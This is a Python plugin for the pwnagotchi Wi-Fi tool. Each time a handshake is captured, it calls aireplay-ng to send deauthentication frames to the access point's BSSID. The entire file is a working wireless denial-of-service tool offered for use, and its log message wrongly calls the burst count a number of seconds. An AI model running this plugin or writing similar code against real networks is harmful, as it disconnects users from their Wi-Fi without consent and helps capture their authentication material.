import time
import subprocess
import pwnagotchi.plugins as plugins

class Deauthenticator(plugins.Plugin):
    __author__ = 'Deus Dust'
    __version__ = '1.0.2'
    __license__ = 'MIT'
    __description__ = 'This will deauth a device after a handshake is made'
    __defaults__ = {
        'enabled': False,
    }

    def __init__(self):
        self.options = dict()
        self.running = False

    def deauth(self, target_mac, interface="wlan0", duration=5):
        try:
            subprocess.run(["aireplay-ng", "--deauth", str(duration), "-a", target_mac, interface], check=True)
            self.log.info(f"Deauthentication attack sent to {target_mac} for {duration} seconds")
        except subprocess.CalledProcessError as e:
            self.log.error(f"Failed to send deauthentication attack: {e}")

    def on_loaded(self):
        self.log.info("Deauthenticator Plugin loaded")
        self.running = True

    def on_handshake(self, agent, filename, access_point):
        target_mac = access_point.bssid
        self.deauth(target_mac)

    def on_unload(self, ui):
        self.log.info("Deauthenticator Plugin unloaded")
        self.running = False
